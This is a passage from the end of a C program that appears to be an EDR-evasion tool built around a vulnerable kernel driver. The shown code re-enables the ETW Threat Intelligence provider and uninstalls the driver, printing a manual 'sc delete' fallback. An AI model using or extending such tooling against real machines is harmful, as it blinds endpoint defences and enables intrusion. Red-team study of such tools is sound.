            // TODO : make this conditionnal, just as kernel callbacks restoring ?
            if (ETWTIState) {
                EnableETWThreatIntelProvider(verbose);
                _putts_or_not(TEXT(""));
            }

            if (foundEDRDrivers) {
                free(foundEDRDrivers);
                foundEDRDrivers = NULL;
            }
        }
    }

    if (kernelMode && removeVulnDriver) {
        // Sleep(5000); // TODO : replace by a reliable method to check if the driver is ready
        _putts_or_not(TEXT("[*] Uninstalling vulnerable driver..."));
        CloseDriverHandle();
        status = UninstallVulnerableDriver();
        if (status == FALSE) {
            _putts_or_not(TEXT("[!] An error occured while attempting to uninstall the vulnerable driver"));
            _tprintf_or_not(TEXT("[*] The service should be manually deleted: cmd /c sc delete %s\n"), GetDriverServiceName());
            lpExitCode = EXIT_FAILURE;
        }
        else {
            _putts_or_not(TEXT("[+] The vulnerable driver was successfully uninstalled!"));
        }
    }

    return lpExitCode;
}
